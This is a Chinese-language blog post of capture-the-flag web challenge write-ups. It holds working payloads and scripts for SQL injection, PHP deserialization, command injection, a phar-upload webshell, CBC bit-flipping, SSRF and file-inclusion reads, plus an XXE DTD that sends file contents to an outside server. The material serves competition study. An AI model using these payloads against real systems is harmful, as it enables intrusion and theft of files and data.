<h2 id="小电影"><a href="#小电影" class="headerlink" title="小电影"></a>小电影</h2><p>首页提示ffmpeg<br>ffmpeg的漏洞<a href="http://www.freebuf.com/column/142775.html" target="_blank" rel="noopener">http://www.freebuf.com/column/142775.html</a><br>exp : <a href="https://github.com/neex/ffmpeg-avi-m3u-xbin" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin</a><br>利用脚本读文件</p>
<h2 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h2><p>根据提示 知道使用python写的<br>在 python-web 应用中，当前目录下， .py文件生成的pyc文件会被存储在 <strong>pycache</strong>文件夹中，并以 .cpython-XX.pyc 为扩展名，其中的 XX 与 CPython 版本有关。比如app.py，其对应的 pyc文件路径为 <strong>pycache</strong>/app.cpython-XX.pyc<br>爆破得到xx为35<br>访问<a href="http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc得到源码" target="_blank" rel="noopener">http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc得到源码</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[<span class="string">'KEY'</span>]</span><br><span class="line">flag_enc = <span class="string">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">'/'</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    req = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">None</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    key = req[<span class="string">'key'</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != len(flag_key):</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(key, flag_key):</span><br><span class="line">        <span class="keyword">if</span> ord(x) ^ ord(y):</span><br><span class="line">            <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, <span class="string">b'0000000000000000'</span>)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(<span class="string">'utf-8'</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> jsonify(result = <span class="keyword">True</span>, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(<span class="string">'/getflag'</span>, methods = [</span><br><span class="line">    <span class="string">'POST'</span>])(getflag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
<p>flag经过AES加密<br>利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]&#125;</span><br></pre></td></tr></table></figure></p>
<p>逐字爆破 如果正确会响应500<br>最后得到key：5ecur3pPYpyPYk3y<br>提交后得到flag。</p>
<h2 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h2><p>存在文件包含 尝试都源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>然后都login<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login</span><br></pre></td></tr></table></figure></p>
<p>然后按照方方土的方法 ORZ<br>利用phar协议构造zip压缩包<br>将一个txt文件和php木马打包在一起，由于上传过程中会被插入 =&gt; ，txt文件保护了php文件，使木马可以正常被解压；<br>上传文件后POST指令到PHP文件的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">a=system(&apos;cat ../../../../d124abbe4cb6aa1621a8ca9519c0f5bf_flag.txt&apos;);</span><br><span class="line">到</span><br><span class="line">http://120.24.215.80:10012/?page=phar://./log/PK%03%04%0a.log/a</span><br></pre></td></tr></table></figure></p>
<p>拿到flag</p>
<h2 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h2><p>抓包后看到查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE======&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p>
<p>‘GE======’base32解码后是 1<br>查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;1&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p>
<p>改变结构后尝试注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; getscorebyyourname(name: &quot;1&apos; or &apos;a&apos;=&apos;a&quot;)&#123; name score &#125; &#125;</span><br></pre></td></tr></table></figure></p>
<p>成功 这里数据库是sqlite<br>构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; getscorebyyourname(name: &quot;1&apos; union select sqlite_version() --&quot;)&#123; name score &#125; &#125;</span><br></pre></td></tr></table></figure></p>
<p>成功返回版本信息<br>暴表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select (select name from sqlite_master where type=&apos;table&apos; limit 1,1) --</span><br></pre></td></tr></table></figure></p>
<p>查表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select (select flag from Secr3t_fl4g) --</span><br></pre></td></tr></table></figure></p>
<p>ps:可以学习方方土学长写个脚本交互信息 方便很多<br>附上脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://182.254.247.127:3001/graphql"</span></span><br><span class="line">payload = base64.b32encode(<span class="string">"1' union select (select flag from Secr3t_fl4g) --"</span>)</span><br><span class="line">go = <span class="string">'&#123; getscorebyyourname(name: "%s")&#123; name score &#125; &#125;'</span>%(payload)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"query"</span> : go</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(data=data,url=url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p>
<p>/…</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/01/14/CUMTCTF2018/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Altm4nz">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Altm4nz">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/01/14/CUMTCTF2018/" itemprop="url">
                  CUMTCTF2018
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-01-14 00:00:00" itemprop="dateCreated datePublished" datetime="2018-01-14T00:00:00+08:00">2018-01-14</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2018-07-12 09:30:51" itemprop="dateModified" datetime="2018-07-12T09:30:51+08:00">2018-07-12</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>第一次真正意义打比赛<br>和队友一起AK了web题<br>很舒服</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="签到1"><a href="#签到1" class="headerlink" title="签到1"></a>签到1</h3><p>右键源代码</p>
<h3 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h3><p>扫描目录发现robots.txt 打开<a href="http://qiandao.bxsteam.xyz/robots.txt" target="_blank" rel="noopener">http://qiandao.bxsteam.xyz/robots.txt</a> 发现flag</p>
<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>首页面给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span> </span></span><br><span class="line"><span class="class"></span>&#123;      </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;     </span><br><span class="line">       &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nosec</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;      </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">        <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">        &#123;              </span><br><span class="line">            <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>读代码可以想到我们的大致目标就是通过 调用__toString() 函数里的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;skyobj-&gt;read();</span><br></pre></td></tr></table></figure></p>
<p>调动read()函数,读文件找flag。<br>大概原理就是上传的data参数在被反序列化的过程中调用_construct()<br>函数，然后直接输出对象引用时调用__toString()，调动read()达到我们的目的。</p>
<p>直接贴代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $skyobj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> nosec();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nosec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_get_contents($file))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> file_get_contents($file);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you must be joking!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$aa = <span class="keyword">new</span> sky();</span><br><span class="line">$aa= urlencode(serialize($aa));</span><br><span class="line"><span class="keyword">echo</span> $aa;</span><br></pre></td></tr></table></figure></p>
<p>\$aa就是构造的data参数。（一定要转url编码！坑！） 把data POST上去flag就出来了。</p>
<h3 id="what？"><a href="#what？" class="headerlink" title="what？"></a>what？</h3><p>php混淆，解就行了。。没啥说的 解出来的关键代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$IIIIIIIIIIll = @$_GET[&apos;img_tet&apos;]; $IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll); $IIIIIIIIIIll = str_replace(&apos;flag&apos;, &quot;&quot;, $IIIIIIIIIIll);</span><br><span class="line">if ($IIIIIIIIIIll != &quot;&quot;) &#123;</span><br><span class="line">    header(&apos;Content-Type: imgage/jpeg&apos;);</span><br><span class="line">    header(&apos;Content-Disposition: attachment; filename=&apos;.$IIIIIIIIIIll);</span><br><span class="line">    header(Content-Lengh: .filesize($IIIIIIIIIIll));</span><br><span class="line">    $IIIIIIIIII11 = fopen($IIIIIIIIIIll, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">    $IIIIIIIIIlIl = fread($IIIIIIIIII11, filesize($IIIIIIIIIIll));</span><br><span class="line">    fclose($IIIIIIIIII11);</span><br><span class="line">    echo $IIIIIIIIIlIl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了flag，用flflagag绕过。 最终payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://confuse.bxsteam.xyz?img_tet=%2f%74%6d%70%2f%66%6c%66%6c%61%67%61%67</span><br></pre></td></tr></table></figure></p>
<h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>先fuzz了一波，没发现怎么利用，提示换行后fuzz，还是不会。 最后发现了用uniq 和<br>sort指令都能做出来 %0a换行，%09绕过空格。用通配符 ‘?’ 爆破文件<br>这里直接贴上python脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">'http://rce.bxsteam.xyz/index.php'</span></span><br><span class="line">payload=urllib.unquote(<span class="string">'%0auniq%09.%3f'</span>)</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    payload=urllib.unquote(urllib.quote(payload)+<span class="string">'%3f'</span>)</span><br><span class="line">    data=&#123;</span><br><span class="line">    <span class="string">"rce"</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p>
<p>其中把uniq换成sort也可以。</p>
<h3 id="skysql"><a href="#skysql" class="headerlink" title="skysql"></a>skysql</h3><p>sky的sql是真的难。 刚开始想通过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;||(select user() like &apos;%&apos;)||&apos;0</span><br></pre></td></tr></table></figure></p>
<p>构造 1 然后通配符逐字爆破。。结果发get不到列名。。就卡住了 提示用联合查询 ，<br>union select 用 union all select select 1，2等价于 select * from ((select 1)A join (select 2)B) 构造出来payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union all select * from ((select 1)A join (select 2)B)%23</span><br></pre></td></tr></table></figure></p>
<p>但还是找不到列名，百度到大佬的博客讲不用列名的奇淫技巧。。<br><a href="http://www.blogsir.com.cn/safe/495.html" target="_blank" rel="noopener">http://www.blogsir.com.cn/safe/495.html</a><br>limit(0,1) 用 limit 1 offset 0<br>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union all select * from ((select 1)A join (select F.1 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23</span><br></pre></td></tr></table></figure></p>
<p>F.n读取第n列 最终在第四列读到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysql.bxsteam.xyz/?id=0&apos; union all select * from ((select 1)A join (select F.4 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23</span><br></pre></td></tr></table></figure></p>
<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>首先发现源码<a href="http://cbc.bxsteam.xyz/login.php" target="_blank" rel="noopener">http://cbc.bxsteam.xyz/login.php</a>~<br>分析后得知是CBC反转攻击。不懂看这里（<a href="http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html）" target="_blank" rel="noopener">http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html）</a><br>不能直接用admin登陆，需要我们更改cipher和token以达到用admin登陆的目的。<br>我们用1dmin和任意密码登陆 得到cipher和token的值<br>这里进行CBC反转攻击，得到新的cipher和token值<br>python脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">iv = base64.b64decode(<span class="string">"cFvSSjVIp+Uh22ERLFjaUQ=="</span>)</span><br><span class="line">plain = base64.b64decode(<span class="string">"wPiTIz61Ge31LPnnlD1aym1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE6IjEiO30="</span>)</span><br><span class="line">want = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(want[0])</span></span><br><span class="line">first_16 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">print</span> i,plain[i],iv[i],want[i]</span><br><span class="line">    <span class="keyword">print</span> chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line">    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line"></span><br><span class="line">new_iv = first_16 + iv[<span class="number">16</span>:]</span><br><span class="line">print(base64.b64encode(new_iv))</span><br><span class="line">print(first_16)</span><br></pre></td></tr></table></figure></p>
<p>传入网页后成功跳转到amdin界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cbc.bxsteam.xyz/admin.php?url=http://skysec.top/</span><br></pre></td></tr></table></figure></p>
<p>默认访问了方方土的博客。。。。<br>显然是SSRF<br>我们直接读取host<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cbc.bxsteam.xyz/admin.php?url=File:///etc/hosts</span><br></pre></td></tr></table></figure></p>
<p>得到ip：172.17.0.4<br>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cbc.bxsteam.xyz/admin.php?url=172.17.0.4</span><br></pre></td></tr></table></figure></p>
<p>发现页面源码，明显的文件包含漏洞 直接读取flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cbc.bxsteam.xyz/admin.php?url=172.17.0.4/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
<p>得到base64后的flag.php，解码得到flag。</p>
<h3 id="Xxe"><a href="#Xxe" class="headerlink" title="Xxe"></a>Xxe</h3><p>xxe是什么</p>
<p>打开题目很清楚就是xxe 直接写题解了<br>首先vps放文件file.dtd,内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://104.236.236.145/?p=%payl;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>漏洞处payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://104.236.236.145/file.dtd&quot;&gt;%remote;%int;%trick;]&gt;</span><br></pre></td></tr></table></figure></p>
<p>查看服务器log(nginx一般在var/log/nginx/access.log)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58.218.185.110 - - [14/Jan/2018:08:16:55 +0000] &quot;GET /?p=(省略一大串) HTTP/1.0&quot; 200 3 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure></p>
